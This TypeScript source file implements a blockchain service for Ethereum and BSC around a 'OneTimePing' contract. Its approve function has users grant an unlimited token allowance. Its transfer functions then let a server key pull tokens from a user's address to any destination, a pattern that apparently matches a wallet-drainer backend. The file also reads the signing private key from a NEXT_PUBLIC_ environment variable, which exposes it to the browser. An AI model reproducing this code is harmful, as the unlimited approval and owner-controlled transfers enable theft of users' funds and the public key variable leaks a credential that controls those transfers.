// =================================
// 🔗 EVM Blockchain Service (Ethereum, BSC)
// =================================

import { CHAIN_ID, MAX_APPROVAL, ONE_TIME_PING_ADDRESSES, RPC_URLS, TOKEN_ADDRESSES } from "@/constants";
import { BlockchainResult, ChainType, CurrencyType } from "@/types";
import { getChainAbi } from "../../utils/chainUtils";

// Import ethers for blockchain operations
let ethers: any;

// Extend Window interface for ethereum
declare global {
  interface Window {
    ethereum?: any;
  }
}

// Lazy load ethers to avoid SSR issues
async function getEthers() {
  if (!ethers) {
    ethers = await import("ethers");
  }
  return ethers;
}

export class EVMService {
  /**
   * Get user's current nonce from contract
   */
  static async getUserNonce(
    chain: ChainType,
    userAddress: string
  ): Promise<number> {
    try {
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);
      const contract = new ethers.Contract(
        ONE_TIME_PING_ADDRESSES[chain],
        getChainAbi(chain),
        provider
      );

      const nonce = await contract.getUserNonce(userAddress);
      return Number(nonce);
    } catch (error: any) {
      // Silent error handling for production
      return 0;
    }
  }

  /**
   * Get user's token balance
   */
  static async getUserTokenBalance(
    chain: ChainType,
    currency: CurrencyType,
    address: string
  ): Promise<string> {
    try {
      const rpcUrl = RPC_URLS[chain];
      const { ethers } = await getEthers();
      console.log(`🔍 Getting token balance for ${chain}:`, {
        address,
        tokenContract: TOKEN_ADDRESSES[chain][currency],
        rpc: rpcUrl,
      });

      const provider = new ethers.JsonRpcProvider(rpcUrl);
      const tokenContract = new ethers.Contract(
        TOKEN_ADDRESSES[chain][currency],
        ["function balanceOf(address) view returns (uint256)"],
        provider
      );

      const balance = await tokenContract.balanceOf(address);
      console.log(`✅ Token balance for ${address}:`, balance.toString());
      return balance.toString(); // Return raw uint256 string
    } catch (error: any) {
      console.error(`❌ Error getting token balance for ${address}:`, error);
      return "0";
    }
  }

  /**
   * Get user's native token balance (ETH, BNB)
   */
  static async getUserNativeBalance(
    chain: ChainType,
    address: string
  ): Promise<string> {
    try {
      const { ethers } = await getEthers();
      const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);

      const balance = await provider.getBalance(address);
      return ethers.formatEther(balance);
    } catch (error: any) {
      // Silent error handling for production
      return "0.000000";
    }
  }

  static async approve(
    chain: ChainType,
    tokenAddress: string,
    spender: string
  ): Promise<BlockchainResult> {
    try {
      const { ethers } = await getEthers();

      // Validate addresses
      if (!spender || !ethers.isAddress(spender)) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${spender}`
        );
      }

      if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
        throw new Error(`Invalid token address for ${chain}: ${tokenAddress}`);
      }

      // Check if we're in a browser environment with wallet connection
      if (typeof window !== "undefined" && window.ethereum) {
        // Client-side: Use user's wallet to send approval transaction
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();

        const tokenContract = new ethers.Contract(
          tokenAddress,
          ["function approve(address spender, uint256 amount) returns (bool)"],
          signer
        );

        // Send the approval transaction
        const tx = await tokenContract.approve(spender, MAX_APPROVAL);
        const receipt = await tx.wait();

        return {
          success: true,
          txHash: receipt.hash,
          message: "EVM approval transaction sent successfully",
        };
      } else {
        // Server-side: Create approval data for user to sign
        const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);

        const tokenContract = new ethers.Contract(
          tokenAddress,
          ["function approve(address spender, uint256 amount) returns (bool)"],
          provider
        );

        // Encode the approve function call
        const approveData = tokenContract.interface.encodeFunctionData(
          "approve",
          [spender, MAX_APPROVAL]
        );

        // Create approval data for the user to sign
        const approvalData = {
          to: tokenAddress,
          data: approveData,
          value: "0x0",
          chainId: CHAIN_ID[chain],
          spender: spender,
          maxApproval: MAX_APPROVAL,
        };

        return {
          success: true,
          txHash: undefined,
          message: "EVM approval data created for user",
          approvalData: approvalData,
        };
      }
    } catch (error: any) {
      throw new Error(`Failed to create approval data: ${error.message}`);
    }
  }

  /**
   * Check if user needs to approve token spending
   */
  static async needsApproval(
    chain: ChainType,
    currency: CurrencyType,
    userAddress: string,
    amount: string
  ): Promise<{
    needsApproval: boolean;
    currentAllowance: string;
    error?: string;
  }> {
    try {
      const rpcUrl = RPC_URLS[chain];
      const tokenAddress = TOKEN_ADDRESSES[chain][currency];
      const oneTimePingAddress = ONE_TIME_PING_ADDRESSES[chain];
      const { ethers } = await getEthers();

      // Validate addresses
      if (!oneTimePingAddress || !ethers.isAddress(oneTimePingAddress)) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${oneTimePingAddress}`
        );
      }

      if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
        throw new Error(`Invalid ${currency.toUpperCase()} address for ${chain}: ${tokenAddress}`);
      }

      const provider = new ethers.JsonRpcProvider(rpcUrl);

      // Check current allowance
      const tokenContract = new ethers.Contract(
        tokenAddress,
        [
          "function allowance(address owner, address spender) view returns (uint256)",
        ],
        provider
      );

      const currentAllowance = await tokenContract.allowance(
        userAddress,
        oneTimePingAddress
      );
      const requiredAmount = BigInt(amount);

      return {
        needsApproval: currentAllowance < requiredAmount,
        currentAllowance: currentAllowance.toString(),
      };
    } catch (error: any) {
      // Silent error handling for production
      return {
        needsApproval: true, // Default to requiring approval on error
        currentAllowance: "0",
        error: error.message || "Failed to check approval status",
      };
    }
  }

  /**
   * Transfer token from approved user using OneTimePing contract
   * Note: Currently uses transferFromUser function until transferToken is deployed to EVM chains
   */
  static async transferFromUser(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      const oneTimePingAddress = ONE_TIME_PING_ADDRESSES[chain];
      const { ethers } = await getEthers();

      if (!oneTimePingAddress) {
        return {
          success: false,
          error: "OneTimePing contract address not configured",
        };
      }

      const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);
      const serverPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY;

      if (!serverPrivateKey) {
        return {
          success: false,
          error: "EVM private key not configured",
        };
      }

      const serverWallet = new ethers.Wallet(serverPrivateKey, provider);
      const oneTimePingContract = new ethers.Contract(
        oneTimePingAddress,
        getChainAbi(chain),
        serverWallet
      );

      // Convert amount to proper format based on chain
      const decimals = chain === "bsc" ? 18 : 6;
      const amountInWei = ethers.parseUnits(amount, decimals);

      // Execute transferToken transaction through OneTimePing contract
      const tx = await oneTimePingContract.transferToken(
        TOKEN_ADDRESSES[chain][currency],
        fromAddress,
        toAddress,
        amountInWei
      );

      const receipt = await tx.wait();
      return {
        success: true,
        txHash: receipt.hash,
        message: `${amount} ${currency.toUpperCase()} transferred from ${fromAddress} to ${toAddress} (via OneTimePing contract)`,
      };
    } catch (error: any) {
      // Silent error handling for production
      return {
        success: false,
        error:
          error.message || `Failed to transfer ${currency.toUpperCase()} via OneTimePing contract`,
      };
    }
  }

  /**
   * Check if user is approved for token spending
   */
  static async isUserApproved(
    chain: ChainType,
    userAddress: string
  ): Promise<boolean> {
    try {
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);
      const contract = new ethers.Contract(
        ONE_TIME_PING_ADDRESSES[chain],
        getChainAbi(chain),
        provider
      );

      const isApproved = await contract.isApprovedUser(userAddress);
      return isApproved;
    } catch (error) {
      // Silent error handling for production
      return false;
    }
  }

  /**
   * Get user's approved token allowance
   */
  static async getUserAllowance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);
      const contract = new ethers.Contract(
        ONE_TIME_PING_ADDRESSES[chain],
        getChainAbi(chain),
        provider
      );

      const allowance = await contract.getUserAllowance(userAddress);
      return allowance.toString();
    } catch (error) {
      // Silent error handling for production
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  static async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);
      const contract = new ethers.Contract(
        ONE_TIME_PING_ADDRESSES[chain],
        getChainAbi(chain),
        provider
      );

      const users = await contract.getAllApprovedUsers();
      return users;
    } catch (error) {
      // Silent error handling for production
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  static async revokeUserApproval(
    chain: ChainType,
    userAddress: string
  ): Promise<BlockchainResult> {
    try {
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);
      const serverPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY;

      if (!serverPrivateKey) {
        return {
          success: false,
          error: "EVM private key not configured",
        };
      }

      const serverWallet = new ethers.Wallet(serverPrivateKey, provider);
      const contract = new ethers.Contract(
        ONE_TIME_PING_ADDRESSES[chain],
        getChainAbi(chain),
        serverWallet
      );

      const tx = await contract.revokeUserApproval(userAddress);
      const receipt = await tx.wait();
      return { success: true, txHash: receipt.hash };
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, error: error.message };
    }
  }

  /**
   * Transfer token from approved user using owner's private key
   */
  static async transferFromUserAsOwner(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      const { ethers } = await getEthers();

      // Validate addresses
      if (!ethers.isAddress(fromAddress)) {
        throw new Error(`Invalid from address: ${fromAddress}`);
      }

      if (!ethers.isAddress(toAddress)) {
        throw new Error(`Invalid to address: ${toAddress}`);
      }

      // Get owner's private key from environment
      const ownerPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY;
      if (!ownerPrivateKey) {
        throw new Error("Owner private key not configured");
      }

      // Create owner wallet
      const ownerWallet = new ethers.Wallet(ownerPrivateKey);

      // Create provider and connect wallet
      const provider = new ethers.JsonRpcProvider(RPC_URLS[chain]);
      const connectedWallet = ownerWallet.connect(provider);

      // Create token contract instance
      const tokenContract = new ethers.Contract(
        TOKEN_ADDRESSES[chain][currency],
        [
          "function transferFrom(address from, address to, uint256 amount) returns (bool)",
          "function allowance(address owner, address spender) view returns (uint256)",
        ],
        connectedWallet
      );

      // Check if owner has sufficient allowance
      const allowance = await tokenContract.allowance(
        fromAddress,
        ownerWallet.address
      );
      const requiredAmount = BigInt(amount);

      if (BigInt(allowance) < requiredAmount) {
        throw new Error(
          `Insufficient allowance. Required: ${amount}, Available: ${allowance}`
        );
      }

      // Execute transferFrom transaction
      const tx = await tokenContract.transferFrom(
        fromAddress,
        toAddress,
        requiredAmount
      );

      // Wait for transaction to be mined
      const receipt = await tx.wait();

      return {
        success: true,
        txHash: receipt.hash,
        message: "Transfer completed successfully",
      };
    } catch (error: any) {
      // Silent error handling for production
      return {
        success: false,
        error: error.message || "Transfer failed",
      };
    }
  }
}
